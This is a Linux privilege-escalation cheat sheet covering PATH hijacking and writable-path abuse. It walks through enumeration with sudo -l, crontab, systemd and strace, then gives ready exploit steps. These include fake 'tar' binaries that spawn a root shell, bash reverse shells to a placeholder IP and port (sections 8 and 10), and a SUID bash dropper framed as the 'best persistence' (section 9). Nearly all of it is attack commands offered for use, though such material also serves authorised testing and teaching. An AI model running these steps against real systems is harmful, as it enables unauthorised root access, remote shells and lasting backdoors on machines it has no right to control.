# Linux Privilege Escalation – Writable Paths & PATH Hijacking

## Purpose

This file provides a structured workflow for identifying and exploiting writable paths and PATH hijacking opportunities for privilege escalation.

Core rules:
- PATH hijacking works when privileged code calls commands without absolute paths
- Writable directories in execution paths are dangerous
- Custom scripts and binaries are high-value targets
- Always inspect what a privileged process is actually calling

---

## 0. Mental Model

PATH hijacking occurs when a privileged process runs commands like:

tar
cp
service
python

instead of:

/bin/tar
/bin/cp
/usr/sbin/service
/usr/bin/python3

If you control a directory in PATH, you can place a malicious binary that gets executed instead.

---

## 1. Check Current PATH

echo $PATH

Break it out:

echo $PATH | tr ':' '\n'

Look for:
- writable directories
- `.`
- `/tmp`, `/dev/shm`
- user-controlled directories

---

## 2. Find Writable Directories

find / -writable -type d 2>/dev/null

Focus on:
- directories in PATH
- /tmp
- /dev/shm
- /opt
- /usr/local/bin
- /usr/local/sbin

---

## 3. Check for '.' in PATH (CRITICAL)

echo $PATH | grep '\.'

If present:
→ current directory can be abused

---

## 4. Identify Privileged Execution Contexts

Check:

sudo -l
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-units --type=service
ps aux

Look for:
- root scripts
- cron jobs
- services
- SUID binaries

---

## 5. Inspect Scripts for Relative Commands

find / -type f -name "*.sh" 2>/dev/null

cat /path/to/script.sh

Look for:

tar -czf backup.tar.gz /home
cp file /backup
service apache2 restart
python script.py

If no absolute path:
→ candidate for hijacking

---

## 6. Inspect Binaries (IMPORTANT)

strings /path/to/binary

Look for:
- system
- exec
- popen
- command names like tar, cp, bash

---

## 7. Basic PATH Hijack Exploit

Example target runs:

tar -czf /tmp/backup.tar.gz /home

Exploit:

echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH

Trigger privileged process

→ root shell

---

## 8. Reverse Shell Payload

cat << 'EOF' > /tmp/tar
#!/bin/bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
EOF

chmod +x /tmp/tar
export PATH=/tmp:$PATH

---

## 9. SUID Bash Dropper (BEST PERSISTENCE)

cat << 'EOF' > /tmp/tar
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF

chmod +x /tmp/tar
export PATH=/tmp:$PATH

After trigger:

/tmp/rootbash -p

---

## 10. Writable Script Abuse (EASIER THAN HIJACKING)

If script is writable:

echo 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> script.sh

---

## 11. High-Value Command Names to Replace

Try replacing:

tar
cp
mv
chmod
chown
service
systemctl
python
python3
bash
sh
find
rsync
curl
wget

---

## 12. Cron PATH Hijack

cat /etc/crontab
ls -la /etc/cron.*

Look for:

* * * * * root tar -czf /tmp/backup.tar.gz /var/www

If PATH weak:
→ hijack

---

## 13. Systemd PATH Hijack

systemctl cat <service>

Look for:

ExecStart=backup.sh
ExecStart=python app.py
ExecStart=tar -czf ...

---

## 14. Sudo PATH Hijack

sudo -l

If script allowed:

cat /opt/script.sh

Exploit:

echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
sudo /opt/script.sh

---

## 15. Confirm with strace (VERY POWERFUL)

strace -f /path/to/script 2>&1 | grep execve

Confirms:
- what commands are executed
- whether paths are absolute

---

## 16. Relative Path Abuse (NO PATH NEEDED)

Look for:

./helper
helper.sh

Replace local file if writable.

---

## 17. Environment Variable Abuse

Check scripts for:

PATH
PYTHONPATH
LD_LIBRARY_PATH

May allow indirect hijack.

---

## 18. Quick Exploit Pattern

1. Find privileged execution
2. Identify relative command
3. Find writable directory
4. Create malicious binary
5. Modify PATH
6. Trigger execution
7. Get root

---

## 19. Fast Triage Commands

echo $PATH | tr ':' '\n'
find / -writable -type d 2>/dev/null
sudo -l
cat /etc/crontab
systemctl list-units --type=service
strings /path/to/binary
strace -f /path/to/script 2>&1 | grep execve

---

## 20. Common Failure Points

- command uses absolute path
- wrong PATH order
- file not executable
- wrong binary name
- script sanitizes PATH
- job not triggered yet

---

## 21. If Stuck

- re-read script carefully
- use strings again
- confirm with strace
- pivot to script modification

---

## 22. Mental Model

Privilege + relative command = opportunity  
Writable path + trusted name = exploit  
Root runs your binary = win  

---

## 23. Golden Rules

- Always inspect scripts for non-absolute paths
- Always check writable directories early
- Always test cron, sudo, systemd
- Use strace to confirm behavior
- Keep payloads simple first